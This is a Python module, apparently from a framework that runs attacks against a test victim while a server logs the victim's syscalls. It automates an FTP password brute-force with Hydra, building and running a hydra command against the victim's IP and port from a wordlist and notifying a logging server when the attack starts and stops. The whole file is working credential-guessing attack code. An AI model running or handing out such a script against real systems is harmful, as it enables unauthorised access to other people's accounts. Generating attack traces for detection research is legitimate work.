import sys, os, time, requests
import subprocess

def run(victim_info, attacker_info, general_info, arguments):

	# Dont print banner if its on repeat mode
	if arguments.repeat == None:
		print('''
		##################################################################################
		#										 #
		# 	                         FTP BRUTEFORCE			 		 #		
		#										 #
		##################################################################################
		''')
		print('''
		This attack will just try to bruteforce its way in with ftp using hydra, after getting in or reaching the end of the wordlist the program will stop.
		
		Therefore, this is simply to try to get in and then stop. You could accomplish the same by using:
			hydra -L /path/to/list/users -P /path/to/list/passwd {victim_ip} ftp -t {number_of_threads} 
		This script was implemented to automate this process and log the syscalls produced on the victim side.
		''')
		n = input('Do you wish to proceed? (y|n) ')
		if n != 'Y' and n != 'y':
			sys.exit("Terminating script")
	s = '21'
	if general_info['default_ftp'] == 'False':
		s = victim_info['ftp_port'] 
	cmd = ""
	if general_info['has_ftp_user'] == 'True':
		cmd = 'hydra -l {user} -P {wordlist} {ip} ftp -s {port} -t 16 -I\n'.format(user=victim_info['ftp_user'], wordlist=general_info['wordlist'], ip=victim_info['ip'], port=s)
	else:
		cmd = 'hydra -L {wordlist} -P {wordlist} {ip} ftp -s {port} -t 16 -I\n'.format(wordlist=general_info['wordlist'], ip=victim_info['ip'], port=s)
	
	
	process = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
	# Give time for Hydra to send the connection and ftpd create the processes
	time.sleep(0.8)
	if general_info['active'] == 'True':
			try:
				requests.get('http://'+ informAudittingStart(general_info), timeout=(1,1))
			except requests.exceptions.ReadTimeout:
		    		pass
			except requests.exceptions.ConnectTimeout:
		    		sys.exit('[-] Failed to connect to Logging server')
	process.wait()
	print('[+] Hydra Returned: ', process.returncode)
	print('[*] Exiting ...')
	if general_info['active'] == 'True':
			try:
				requests.get('http://'+ informAudittingStop(general_info), timeout=(1,1))
			except requests.exceptions.ReadTimeout:
		    		pass
			except requests.exceptions.ConnectTimeout:
		    		sys.exit('[-] Failed to connect to Logging server')

def informAudittingStart(general_info):
	exploit = 'FTP'

	url = general_info['host'] + ':' + general_info['port'] + '/start?exploit=' + exploit
	return url

def informAudittingStop(general_info):
	exploit = 'FTP'

	url = general_info['host'] + ':' + general_info['port'] + '/stop?exploit=' + exploit
	return url
